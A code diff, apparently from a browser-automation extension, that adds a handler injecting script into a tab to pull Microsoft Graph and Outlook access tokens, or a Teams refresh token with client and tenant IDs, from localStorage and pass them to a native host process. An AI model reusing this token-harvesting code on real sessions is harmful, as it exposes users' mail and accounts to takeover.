@@ -378,6 +378,78 @@ export function connectNativeHost(port: number = NATIVE_HOST.DEFAULT_PORT): bool
             },
           });
         }
+      } else if (message.type === NativeMessageType.EXEC_TAB_JS && message.requestId) {
+        const requestId = message.requestId;
+        const { tabId, code, timeoutMs } = message.payload || {};
+        try {
+          if (typeof tabId !== 'number' || typeof code !== 'string') {
+            throw new Error('exec_tab_js requires numeric tabId and string code');
+          }
+          const execTimeoutMs = typeof timeoutMs === 'number' ? timeoutMs : 15000;
+          // Use predefined functions to avoid new Function() / eval() which are blocked by CSP.
+          // 'code' is an operation name: 'outlook' | 'teams_rt'
+          const results = await Promise.race([
+            chrome.scripting.executeScript({
+              target: { tabId },
+              world: 'MAIN',
+              func: (op: string): string | null => {
+                if (op === 'outlook') {
+                  let graph: { token: string; expiresOn: number } | null = null;
+                  let rest: { token: string; expiresOn: number } | null = null;
+                  for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i)!;
+                    if (!key.includes('accesstoken')) continue;
+                    let val: { secret?: string; expiresOn?: string } | null = null;
+                    try { val = JSON.parse(localStorage.getItem(key)!); } catch { continue; }
+                    if (!val?.secret) continue;
+                    if (!graph && (key.includes('graph.microsoft.com') || key.includes('00000003-0000-0000-c000-000000000000'))) {
+                      graph = { token: val.secret, expiresOn: parseInt(val.expiresOn ?? '0') };
+                    }
+                    if (!rest && key.includes('outlook.office.com') && key.includes('mail.readwrite')) {
+                      rest = { token: val.secret, expiresOn: parseInt(val.expiresOn ?? '0') };
+                    }
+                    if (graph && rest) break;
+                  }
+                  return JSON.stringify({ graph, rest });
+                } else if (op === 'teams_rt') {
+                  for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i)!;
+                    if (!key.includes('refreshtoken')) continue;
+                    let val: { secret?: string; clientId?: string; homeAccountId?: string } | null = null;
+                    try { val = JSON.parse(localStorage.getItem(key)!); } catch { continue; }
+                    if (val?.secret && val?.clientId) {
+                      let tenantId: string | null = null;
+                      if (val.homeAccountId) {
+                        const parts = val.homeAccountId.split('.');
+                        if (parts.length >= 2) tenantId = parts[1];
+                      }
+                      return JSON.stringify({ refreshToken: val.secret, clientId: val.clientId, tenantId });
+                    }
+                  }
+                  return JSON.stringify(null);
+                }
+                return null;
+              },
+              args: [code],
+            }),
+            new Promise<never>((_, reject) =>
+              setTimeout(() => reject(new Error(`exec_tab_js timed out after ${execTimeoutMs}ms`)), execTimeoutMs),
+            ),
+          ]);
+          const rawResult = (results as chrome.scripting.InjectionResult[])?.[0]?.result;
+          nativePort?.postMessage({
+            responseToRequestId: requestId,
+            payload: { status: 'success', data: rawResult },
+          });
+        } catch (error) {
+          nativePort?.postMessage({
+            responseToRequestId: requestId,
+            payload: {
+              status: 'error',
+              error: error instanceof Error ? error.message : String(error),
+            },
+          });
+        }
       } else if (message.type === 'rr_list_published_flows' && message.requestId) {
         const requestId = message.requestId;
         try {
